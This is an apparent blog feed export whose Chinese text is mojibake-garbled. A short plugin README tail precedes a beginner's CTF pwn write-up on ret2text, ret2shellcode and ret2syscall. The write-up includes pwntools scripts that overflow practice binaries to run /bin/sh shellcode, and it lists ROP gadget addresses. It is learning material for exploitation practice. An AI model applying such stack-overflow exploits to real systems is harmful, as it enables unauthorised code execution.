ç½‘ç»œæˆ–ç½‘ç»œè¾ƒå·®æ—¶ä¹Ÿèƒ½é¢„è§ˆ   </li><li>æœ¬åœ°å›¾ç‰‡ æ”¾åœ¨ä¸ æ–‡ç« æ–‡ä»¶ååŒåæ–‡ä»¶å¤¹å†… æ–¹ä¾¿ç®¡ç†</li></ol><p><code>è¡¥å……:</code><br>å¾ˆå¤š <code>markdownç¼–è¾‘å™¨</code> æä¾›ç²˜è´´å›¾ç‰‡åˆ°æœ¬åœ°å›¾ç‰‡æ–‡ä»¶å¤¹, è¿™äº›å›¾ç‰‡æ–‡ä»¶åé€šå¸¸ä¸æ˜“è¯», è¾ƒé•¿, å¦‚æœæ¯æ¬¡åˆ é™¤æ–‡ç« ä¸­çš„å›¾ç‰‡å¼•ç”¨, éƒ½æ‰‹åŠ¨å»åˆ é™¤ç›¸åº”å›¾ç‰‡, ä»¥åŠåˆ é™¤æ–‡ç« , æ‰‹åŠ¨åˆ é™¤å…³è”å›¾ç‰‡æ–‡ä»¶å¤¹, æ¯”è¾ƒéº»çƒ¦, ä½†ä¸åˆ é™¤, æœªå¼•ç”¨å›¾ç‰‡åˆä¼šè¶Šæ¥è¶Šå¤š, å› æ­¤ <code>åˆ é™¤æœªå¼•ç”¨å›¾ç‰‡å·¥å…·</code> åº”è¿è€Œç”Ÿ!      </p><ul><li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: ğŸ”§ Image detection. | å›¾ç‰‡æ£€æµ‹ | æ¸…ç†æœªå¼•ç”¨å›¾ç‰‡ | åˆ é™¤æœªå¼•ç”¨å›¾ç‰‡ | æ£€æŸ¥å¼•ç”¨çš„å›¾ç‰‡æ˜¯å¦æœ‰æ•ˆ | GitHub Actions</a></li><li><a href="https://github.com/yiyungent/coo">yiyungent&#x2F;coo: ğŸ§° .NET è‡ªç”¨CLI, å·¥å…·é›†</a></li></ul></blockquote><h2 id="ç›¸å…³é¡¹ç›®"><a href="#ç›¸å…³é¡¹ç›®" class="headerlink" title="ç›¸å…³é¡¹ç›®"></a>ç›¸å…³é¡¹ç›®</h2><ul><li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: ğŸ”§ Image detection. | å›¾ç‰‡æ£€æµ‹ | æ¸…ç†æœªå¼•ç”¨å›¾ç‰‡ | åˆ é™¤æœªå¼•ç”¨å›¾ç‰‡ | æ£€æŸ¥å¼•ç”¨çš„å›¾ç‰‡æ˜¯å¦æœ‰æ•ˆ | GitHub Actions</a></li><li><a href="https://github.com/xcodebuild/hexo-asset-image">xcodebuild&#x2F;hexo-asset-image</a></li><li><a href="https://github.com/cocowool/hexo-image-link">cocowool&#x2F;hexo-image-link</a></li><li><a href="https://github.com/cnzsb/hexo-asset">cnzsb&#x2F;hexo-asset</a></li></ul><h2 id="Donate"><a href="#Donate" class="headerlink" title="Donate"></a>Donate</h2><p>hexo-asset-img is an MIT licensed open source project and completely free to use. However, the amount of effort needed to maintain and develop new features for the project is not sustainable without proper financial backing.</p><p>We accept donations through these channels:</p><ul><li><a href="https://afdian.net/@yiyun" target="_blank">çˆ±å‘ç”µ</a></li></ul><h2 id="Author"><a href="#Author" class="headerlink" title="Author"></a>Author</h2><p><strong>hexo-asset-img</strong> Â© <a href="https://github.com/yiyungent">yiyun</a>, Released under the <a href="./LICENSE">MIT</a> License.<br><br>Authored and maintained by yiyun with help from contributors (<a href="https://github.com/yiyungent/hexo-asset-img/contributors">list</a>).</p><blockquote><p>GitHub <a href="https://github.com/yiyungent">@yiyungent</a> Gitee <a href="https://gitee.com/yiyungent">@yiyungent</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwné¢˜è§£</title>
      <link href="/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="ä»0å¼€å§‹çš„Pwnç”Ÿæ´»"><a href="#ä»0å¼€å§‹çš„Pwnç”Ÿæ´»" class="headerlink" title="ä»0å¼€å§‹çš„Pwnç”Ÿæ´»"></a>ä»0å¼€å§‹çš„Pwnç”Ÿæ´»</h1><p>ä¸å…¶è¯´æ˜¯é¢˜è§£ï¼Œä¸å¦‚è¯´æ˜¯èŒæ–°åˆæ¬¡è§é¢çš„å“¦å“ˆå‘¦</p><h1 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h1><p>æ²¡å¾—è¯´ï¼Œå¤ä¹ çš„æ—¶å€™å†å†™</p><p>æ›´æƒå¨çš„æŸ¥æ‰¾åé—¨å‡½æ•°æ–¹æ³•ï¼š</p><ol><li>ctrl + Fæœç´¢ system</li><li>shift + F12çœ‹æœ‰æ²¡æœ‰å­—ç¬¦ä¸² &#x2F;bin&#x2F;sh</li></ol><h1 id="Ret2ShellCode"><a href="#Ret2ShellCode" class="headerlink" title="Ret2ShellCode"></a>Ret2ShellCode</h1><h4 id="ç¬¬ä¸€æ¬¡çš„æ€è·¯"><a href="#ç¬¬ä¸€æ¬¡çš„æ€è·¯" class="headerlink" title="ç¬¬ä¸€æ¬¡çš„æ€è·¯"></a>ç¬¬ä¸€æ¬¡çš„æ€è·¯</h4><h5 id="æŸ¥çœ‹ä¿æŠ¤"><a href="#æŸ¥çœ‹ä¿æŠ¤" class="headerlink" title="æŸ¥çœ‹ä¿æŠ¤"></a>æŸ¥çœ‹ä¿æŠ¤</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124203338698.png" alt="image-20241124203338698"></p><p>ä¿æŠ¤ &#x3D;  ZERO</p><p>32ä½</p><h5 id="IDAä¸‹é™æ€è°ƒè¯•"><a href="#IDAä¸‹é™æ€è°ƒè¯•" class="headerlink" title="IDAä¸‹é™æ€è°ƒè¯•"></a>IDAä¸‹é™æ€è°ƒè¯•</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124203655566.png" alt="image-20241124203655566"> </p><p>setvbufæ˜¯æ¸…ç©ºç¼“å†²åŒºã€‚ç®€å•æ¥è¯´å°±æ˜¯è¯´ä¸è¦è®¾ç½®è¾“å…¥è¾“å‡ºç¼“å†²åŒºï¼Œä¸ç„¶æ²¡æ»¡å‘ä¸å‡ºå»ã€‚</p><p>è¿™ä¸ªgetså¾ˆå…³é”®ï¼ŒåŸºæœ¬åˆ¤åˆ«æ˜¯æº¢å‡ºè§£æ³•ã€‚</p><p>æ‰§è¡Œå†…å®¹ä½æŠŠsçš„å€¼èµ‹ç»™buf2</p><p>è®©æˆ‘ä»¬æŸ¥çœ‹ä¸‹buf2çš„ä½ç½®</p><p>â€‹                                                                                                                                                                                                                                                                                                                                                                                             </p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124204040843.png" alt="image-20241124204040843">                                                                                                                                                                           </p><p>bssåŒºåŸŸæ˜¯å¯æ‰§è¡Œçš„ï¼Œåªéœ€è¦åœ¨è¿™é‡Œè¦†ç›–ä¸Šæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„ä»£ç å°±å¥½äº†</p><p>è¿”å›åœ°å€è¦†ç›–ä½è¿™ä¸ªbssçš„åœ°å€</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124213147737.png" alt="image-20241124213147737" style="zoom: 33%;"><p>æ‰€ä»¥æˆ‘çŒœæµ‹åº”è¯¥æ˜¯è¦†ç›–strcpyçš„è¿”å›åœ°å€åˆ°buf2æ•°ç»„çš„åœ°å€ï¼Œæ•°ç»„å†…å®¹åº”è¯¥æ˜¯&#x2F;bin&#x2F;shå¯¹åº”çš„æœºå™¨ç </p><p>payload &#x3D; 0x64+4çš„æ— æ•ˆæ•°æ®åŠ ä¸Š&#x2F;bin&#x2F;shçš„æœºå™¨ç </p><h4 id="æ­£ç¡®æ€è·¯"><a href="#æ­£ç¡®æ€è·¯" class="headerlink" title="æ­£ç¡®æ€è·¯"></a>æ­£ç¡®æ€è·¯</h4><p>sæ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œgetså¯ä»¥å°†ä»»æ„é•¿åº¦çš„å­—ç¬¦èµ‹å€¼ç»™sã€‚å½“è¾“å…¥è¿‡é•¿æ—¶ï¼Œä¸€ç›´å‘é«˜åœ°å€æº¢å‡ºå¯èƒ½è¦†ç›–mainå‡½æ•°çš„è¿”å›åœ°å€ã€‚æ‰€ä»¥æº¢å‡ºçš„æ ˆå¸§åº”è¯¥æ˜¯mainå‡½æ•°çš„æ ˆå¸§</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124213831067.png" alt="image-20241124213831067"> </p><p>è¿™é‡Œçœ‹åˆ°ï¼Œè·ç¦»ebpåˆšå¥½æ˜¯100å­—èŠ‚ã€‚</p><p>ebpæŒ‡å‘çš„æ˜¯æ ˆåº•ï¼Œç´§éšå…¶åçš„å°±æ˜¯previous ebpï¼Œå†å¾€åé¢å°±æ˜¯return addressäº†</p><p>ä¸è¿‡é™æ€è°ƒè¯•åˆ†æä¸ä¸€å®šæ­£ç¡®ï¼Œé¢˜ç›®å¯èƒ½æœ‰çµæ´»æ€§ã€‚æ­¤æ—¶éœ€è¦åŠ¨æ€è°ƒè¯•ã€‚åŠ¨æ€æ‰æ˜¯çœŸæ­£çš„å®è·µå‡ºçœŸçŸ¥ã€‚</p><h5 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h5><p>getsè¾“å…¥åç›´æ¥çœ‹æ ˆå†…å®¹</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124214947632.png" alt="image-20241124214947632"> </p><p>é¦–å…ˆç¬¬ä¸€è¡Œï¼Œespã€‚å®ƒçš„æ„æ€æ˜¯ï¼Œè¿™é‡Œå­˜çš„æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒAAAAæ˜¯è¿™ä¸ªæŒ‡é’ˆå­˜çš„å†…å®¹</p><p>AAAAå®é™…çš„ä½ç½®åœ¨cddcå¤„</p><p>å‘ä¸ŠæŸ¥çœ‹å¯„å­˜å™¨ebpçš„å€¼              </p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124215221005.png" alt="image-20241124215221005"> </p><p>ä»eaxåˆ°ebpå°±æ˜¯åº”è¯¥å¡«å……çš„æ•°ç»„çš„å€¼ï¼Œç„¶åå†ç”¨4å­—èŠ‚åƒåœ¾æ•°æ®å¡«å……æ‰previous ebpï¼Œæœ€åè¦†ç›–è¿”å›åœ°å€å³å¯</p><p><strong>ç»“æœåœ°å€å·®æ˜¯108ï¼Œå¹¶é100</strong>ã€‚è¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ</p><h5 id="å†™æ”»å‡»è„šæœ¬"><a href="#å†™æ”»å‡»è„šæœ¬" class="headerlink" title="å†™æ”»å‡»è„šæœ¬"></a>å†™æ”»å‡»è„šæœ¬</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)+p32(<span class="number">0x0804A080</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ljust(int n,char c) å‰æ–¹å­—èŠ‚æµä¸å˜ï¼Œåæ–¹è¡¥å……æ•°æ®Cç›´åˆ°åˆ°è¾¾nä¸ªå­—èŠ‚</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124223816018.png" alt="image-20241124223816018"> </p><p>è¿™ä¸å¯¹å•Š :question:</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241125105258338.png" alt="image-20241125105258338"> </p><p>ä»”ç»†ä¸€çœ‹ï¼Œbssæ®µç«Ÿç„¶æ²¡æœ‰å¯æ‰§è¡Œæƒé™ã€‚è¿™å’Œè¯´å¥½çš„ä¸ä¸€æ ·å•Š</p><p>ç ´æ¡ˆäº†ï¼ŒLInuxå†…æ ¸é—®é¢˜ï¼Œä¸ç”¨çº ç»“è¿™é¢˜å°±æ˜¯è¿™æ ·åšçš„ã€‚</p><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨mprotectå‡½æ•°æˆ–è€…æ¢åˆ°Ubuntu 18ä»¥ä¸‹çš„ç‰ˆæœ¬</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>åŠ¨æ€è°ƒè¯•å’Œé™æ€åˆ†æçš„ç»“æœå¯èƒ½æœ‰åŒºåˆ«ï¼Œä¸€åˆ‡æŒ‰ç…§åŠ¨æ€è°ƒè¯•çš„æ¥ã€‚æ‰€ä»¥æ‰¾é•¿åº¦çš„æ—¶å€™å‡ºäº†é”™</p><p>å¦å¤–éœ€è¦é€šè¿‡pwntoolsæ¥ç”Ÿæˆshellcodeçš„æœºå™¨ç </p><h1 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-ret2shellcode"><a href="#NewStarCTF-å…¬å¼€èµ›èµ›é“-ret2shellcode" class="headerlink" title="[NewStarCTF å…¬å¼€èµ›èµ›é“] ret2shellcode"></a>[NewStarCTF å…¬å¼€èµ›èµ›é“] ret2shellcode</h1><h4 id="ç¬¬ä¸€æ¬¡çš„æ€è·¯-1"><a href="#ç¬¬ä¸€æ¬¡çš„æ€è·¯-1" class="headerlink" title="ç¬¬ä¸€æ¬¡çš„æ€è·¯"></a>ç¬¬ä¸€æ¬¡çš„æ€è·¯</h4><h5 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126203800780.png" alt="image-20241126203800780"></p><p>æ²¡æœ‰Canaryä¿æŠ¤çš„è¯ï¼Œå°†è¿”å›åœ°å€è¦†ç›–æ˜¯å¯è¡Œçš„ã€‚åº”è¯¥è¿˜æ˜¯ä¼ ç»Ÿæ ˆæº¢å‡ºã€‚</p><p>æ³¨æ„æ˜¯64ä½</p><h5 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126200304228.png" alt="image-20241126200304228"> </p><p>å…³é”®æœ‰ä¸‰æ­¥ï¼Œç¬¬ä¸€æ­¥æœ‰ä¸€ä¸ªmmapå‡½æ•°ï¼ˆè¿™æ˜¯å•¥æˆ‘ä¸çŸ¥é“ï¼‰ï¼Œç¬¬äºŒæ­¥å‘bufæ•°ç»„<strong>æ ‡å‡†è¾“å…¥</strong>0x100å­—èŠ‚çš„æ•°æ®ï¼Œç¬¬ä¸‰æ­¥å‘v4æ•°ç»„æ ‡å‡†è¾“å…¥0x100å­—èŠ‚çš„æ•°æ®ã€‚ULLåç¼€ç›®çš„æ˜¯ç¡®ä¿ç¼–è¯‘å™¨æ­£ç¡®è§£æè¯¥æ•°å­—çš„ç±»å‹ã€‚</p><p><strong>readå’Œgetsçš„åŒºåˆ«åœ¨äºï¼š</strong></p><p><code>read</code>éœ€è¦æŒ‡å®šè¯»å–é•¿åº¦ï¼Œå¯ä»¥é¿å…ç¼“å†²åŒºæº¢å‡ºï¼›<code>gets</code>è¯»å–è¾“å…¥ç›´åˆ°\nå‡ºç°ï¼Œä¼šå¯¼è‡´ç¼“å†²åŒºæº¢å‡º</p><p><code>read</code>éœ€è¦æ‰‹åŠ¨å¤„ç†è¯»å–çš„å­—èŠ‚å¹¶åœ¨ç¼“å†²åŒºæœ«å°¾æ·»åŠ \0å½¢æˆå­—ç¬¦ä¸²ï¼›<code>gets</code>è‡ªåŠ¨åœ¨å­—ç¬¦ä¸²æœ«å°¾ç”°é—´ç©ºå­—ç¬¦\0å½¢æˆå­—ç¬¦ä¸²</p><p>ç™¾åº¦ä¸€ä¸‹ï¼š<code>mmap</code> </p><p><a href="https://www.cnblogs.com/huxiao-tee/p/4660352.html">https://www.cnblogs.com/huxiao-tee/p/4660352.html</a></p><p><strong>å†…å­˜æ˜ å°„ï¼š</strong>ç®€è€Œè¨€ä¹‹å°±æ˜¯å°†ç”¨æˆ·ç©ºé—´çš„ä¸€æ®µå†…å­˜åŒºåŸŸæ˜ å°„åˆ°å†…æ ¸ç©ºé—´ï¼Œæ˜ å°„æˆåŠŸåï¼Œç”¨æˆ·å¯¹è¿™æ®µå†…å­˜åŒºåŸŸçš„ä¿®æ”¹å¯ä»¥ç›´æ¥åæ˜ åˆ°å†…æ ¸ç©ºé—´ï¼ŒåŒæ ·ï¼Œå†…æ ¸ç©ºé—´å¯¹è¿™æ®µåŒºåŸŸçš„ä¿®æ”¹ä¹Ÿç›´æ¥åæ˜ ç”¨æˆ·ç©ºé—´ã€‚</p><p><code>mmap</code>æ˜¯ä¸€ç§<strong>å†…å­˜æ˜ å°„æ–‡ä»¶çš„æ–¹æ³•</strong>ï¼Œå³å°†ä¸€ä¸ªæ–‡ä»¶æˆ–è€…å…¶å®ƒå¯¹è±¡æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå®ç°æ–‡ä»¶ç£ç›˜åœ°å€å’Œè¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ä¸€æ®µè™šæ‹Ÿåœ°å€çš„ä¸€ä¸€å¯¹æ˜ å…³ç³»ã€‚</p><p><strong>å‡½æ•°åŸå‹</strong>ï¼š<code>void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);</code></p><p>startï¼šæ˜ å°„åŒºçš„å¼€å§‹åœ°å€</p><p>lengthï¼šæ˜ å°„åŒºçš„é•¿åº¦</p><p>protï¼šæœŸæœ›çš„å†…å­˜ä¿æŠ¤æ ‡å¿—</p><p>flagsï¼šæŒ‡å®šæ˜ å°„å¯¹è±¡çš„ç±»å‹ï¼Œæ˜ å°„é€‰é¡¹å’Œæ˜ å°„é¡µæ˜¯å¦å¯ä»¥å…±äº«</p><p>fdï¼šæœ‰æ•ˆçš„æ–‡ä»¶æè¿°è¯</p><p>offsetï¼šè¢«æ˜ å°„å¯¹è±¡å†…å®¹çš„èµ·ç‚¹</p><p>è¿™ä¸ªæ—¶å€™ç¬¬ä¸€æ­¥å°±æ¸…æ¥šäº†ï¼Œå³å°†bufæ˜ å°„åˆ°ä¸€ä¸ª4096å­—èŠ‚çš„å†…å­˜ï¼Œå…¶èµ·å§‹åœ°å€ä¸ºè™šæ‹Ÿåœ°å€0x233000ï¼Œä¸”è¯¥å†…å­˜ç©ºé—´<strong>å¯è¯»å¯å†™å¯æ‰§è¡Œ</strong>ï¼ˆçœç•¥äº†åŠ¨æ€åˆ†ævmmapæ²¡å‘ç°æœ‰rwxæ®µï¼‰</p><p>æ‰¾åˆ°å¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œæ€è·¯ä¸€ä¸‹å­å°±æ¸…æ™°äº†ï¼Œå°†shellcodeé€šè¿‡bufæ•°ç»„æ˜ å°„åˆ°è¿™ä¸ªè™šæ‹Ÿç©ºé—´ï¼Œç„¶åé€šè¿‡v4è¦†ç›–è¿”å›åœ°å€ï¼Œè¦†ç›–çš„è¿”å›åœ°å€æ°å¥½ä¸ºè¿™ä¸ªæ˜ å°„åŒºçš„èµ·å§‹åœ°å€ã€‚<del>å¯¹è¿˜æ˜¯ä¸å¯¹ï¼Ÿ</del></p><p>é‚£ä¹ˆç¬¬ä¸€æ¬¡å†™å…¥çš„æ•°æ®å°±æ˜¯shellcode &#x3D; asm(shellcraft.sh())</p><p>ç¬¬äºŒæ¬¡å†™å…¥çš„æ•°æ®ä¾¿ä¸º(0x30+8)çš„åƒåœ¾æ•°æ®åŠ ä¸Šp64(0x233000)</p><p>å‘ç°ä¸€ä¸ªå°é—®é¢˜ï¼Œè¿™é‡Œä¼šæŠŠ bufè¦†ç›–æ‰å— ï¼ˆbuf[]çš„é¦–åœ°å€ï¼‰ï¼Œè¦†ç›–äº†ä¼šæœ‰å½±å“å—ã€‚</p><h5 id="å†™è„šæœ¬"><a href="#å†™è„šæœ¬" class="headerlink" title="å†™è„šæœ¬"></a>å†™è„šæœ¬</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">addr = <span class="number">0x233000</span></span><br><span class="line">payload = (<span class="number">0x30</span>+<span class="number">8</span>)*<span class="string">b&#x27;A&#x27;</span>+p64(<span class="number">0x233000</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h5 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126205924180.png" alt="image-20241126205924180"></p><p>å§æ§½ï¼Œä½ æµ©é”…ï¼Œç›´æ¥è¿‡äº†</p><p>ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ²¡çœ‹æç¤ºè§£å‡ºæ¥ä¸€é“pwné¢˜ï¼ˆæŠ›å¼€æŸ¥äº†æŸ¥mmapå‡½æ•°ä¸è°ˆï¼‰</p><h1 id="Ret2Syscall"><a href="#Ret2Syscall" class="headerlink" title="Ret2Syscall"></a>Ret2Syscall</h1><h4 id="å“ˆå‰å’©å¾—"><a href="#å“ˆå‰å’©å¾—" class="headerlink" title="å“ˆå‰å’©å¾—"></a>å“ˆå‰å’©å¾—</h4><h5 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128143917697.png" alt="image-20241128143917697"> </p><p>32ä½ï¼Œæ— ä¿æŠ¤ï¼Œæ ˆæº¢å‡º</p><h5 id="é™æ€åˆ†æ-1"><a href="#é™æ€åˆ†æ-1" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128144009902.png" alt="image-20241128144009902"> </p><p>é€šè¿‡v4æ•°ç»„è¦†ç›–mainå‡½æ•°çš„è¿”å›åœ°å€</p><p>å…¶é•¿åº¦ä¸º0x64+4</p><p>è€Œä¸”è¿™æ¬¡æ²¡æœ‰åé—¨å‡½æ•°ä¹Ÿä¸èƒ½æ³¨å…¥shellcodeã€‚è€ƒè™‘ROPï¼Œç³»ç»Ÿè°ƒç”¨</p><h5 id="æ‰¾åˆ°gadgetåœ°å€"><a href="#æ‰¾åˆ°gadgetåœ°å€" class="headerlink" title="æ‰¾åˆ°gadgetåœ°å€"></a>æ‰¾åˆ°gadgetåœ°å€</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128144400349.png" alt="image-20241128144400349"> </p><p>é¦–å…ˆæƒ³æƒ³&#x2F;bin&#x2F;shå¾—ç³»ç»Ÿè°ƒç”¨æµç¨‹æ˜¯ä»€ä¹ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128144455036.png" alt="image-20241128144455036"> </p><p>äºæ˜¯æˆ‘ä»¬éœ€è¦å¾—åˆ†åˆ«æœ‰</p><p><code>pop eaxï¼›ret</code>åœ°å€0x080bb196</p><p><code>pop ebxï¼›ret</code>åœ°å€0x0804838e</p><p>å…³äºecxå’Œedxåº”è¯¥éœ€è¦æ¸…ç©ºä¸€ä¸‹çš„å§ã€‚ä½†æ˜¯è¿™é‡Œå¦‚æœpopï¼Œretæ„Ÿè§‰å¾ˆéº»çƒ¦ã€‚ä½†æ‰¾ä¸åˆ°xorï¼Œretå°±ç®—äº†</p><p>æ‰€ä»¥</p><p> <code>xor ecxï¼Œecxï¼›ret</code>   æˆ–è€… pop retåœ°å€</p><p><code>xor edxï¼Œedxï¼›ret</code>  æˆ–è€…  pop ret</p><p><code>int 0x80</code></p><p>è¿™äº›æ˜¯æˆ‘ä»¬éœ€è¦çš„gadgetã€‚</p><p>ä½†äº‹å®ä¸Šå‘ç°åªæœ‰xor eaxï¼Œeaxï¼Œæ‰€ä»¥ecxï¼Œedxåº”è¯¥æ˜¯ä¸éœ€è¦æ€ä¹ˆç®¡çš„ã€‚</p><h5 id="æ„å»ºpayload"><a href="#æ„å»ºpayload" class="headerlink" title="æ„å»ºpayload"></a>æ„å»ºpayload</h5><p>popçš„ä¸œä¸œæ˜¯æ ˆé¡¶å…ƒç´ ï¼Œå³espæŒ‡å‘çš„æ•°ã€‚è€Œv4æ•°ç»„åœ¨espçš„ä¸Šæ–¹ã€‚è¯´æ˜æ²¡åŠæ³•é€šè¿‡v4æ¥ä¿®æ”¹espæŒ‡å‘å†…å®¹çš„å€¼å•Šã€‚</p><p>é‚£è¯¥æ€ä¹ˆåŠã€‚</p><p>å”äº†ï¼Œè®°ä½espä¸€ç›´æŒ‡å‘æ ˆé¡¶ã€‚</p><h4 id="æ­£ç¡®æ€è·¯-1"><a href="#æ­£ç¡®æ€è·¯-1" class="headerlink" title="æ­£ç¡®æ€è·¯"></a>æ­£ç¡®æ€è·¯</h4><h5 id="å¯»æ‰¾åé—¨å‡½æ•°"><a href="#å¯»æ‰¾åé—¨å‡½æ•°" class="headerlink" title="å¯»æ‰¾åé—¨å‡½æ•°"></a>å¯»æ‰¾åé—¨å‡½æ•°</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128150557112.png" alt="image-20241128150557112"> </p><p>å°è¯•äº†ä¸¤ç§æ–¹æ³•ï¼ˆç¬¬ä¸€é¢˜ï¼‰ï¼Œåªæ‰¾åˆ°äº†å­—ç¬¦ä¸²ï¼ˆåé—¨å‡½æ•°å¯¹åº”çš„å‚æ•°ï¼‰ï¼Œä½†æ²¡æ‰¾åˆ°åé—¨å‡½æ•°ï¼ˆsystemï¼‰ã€‚</p><h5 id="æ‰¾gadget"><a href="#æ‰¾gadget" class="headerlink" title="æ‰¾gadget"></a>æ‰¾gadget</h5><p><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | grep eax</code>æ‰¾åˆ°ç¬¬ä¸€ä¸ªgadgetã€‚å…¶ä»–ä»¥æ­¤ç±»æ¨</p><p>ecxå’Œedxå…¶å®ç¬¬ä¸€æ¬¡æ„å»ºpayloadçš„æ—¶å€™æ— éœ€åœ¨æ„ã€‚å› ä¸ºä¸€èˆ¬æƒ…å†µä¸‹è¿™ä¸ªæ—¶å€™ecxå’Œedxä¸º0ã€‚å¯ä»¥å…ˆè¯•è¯•çœ‹ï¼Œå¦‚æœæœ‰é—®é¢˜å†è¯´ã€‚</p><p>è¿™é‡Œæ‰¾åˆ°ä¸¤ä¸ªgadgetï¼š</p><p>0x080bb196 : pop eax ; ret</p><p>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</p><p>æ‰¾ä¸åˆ°çš„å°±æ›¿ä»£ã€‚</p><p>æœ€å 0x08049421 : int 0x80</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128152855316.png" alt="image-20241128152855316"> </p><p>ä»ä¸‹åˆ°ä¸Šå¾—çœ‹</p><h5 id="åŠ¨æ€è°ƒè¯•å°è¯•è¦†ç›–åŸæœ‰è¿”å›åœ°å€"><a href="#åŠ¨æ€è°ƒè¯•å°è¯•è¦†ç›–åŸæœ‰è¿”å›åœ°å€" class="headerlink" title="åŠ¨æ€è°ƒè¯•å°è¯•è¦†ç›–åŸæœ‰è¿”å›åœ°å€"></a>åŠ¨æ€è°ƒè¯•å°è¯•è¦†ç›–åŸæœ‰è¿”å›åœ°å€</h5><p> <img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241129101348955.png" alt="image-20241129101348955"></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241129101419976.png" alt="image-20241129101419976"> 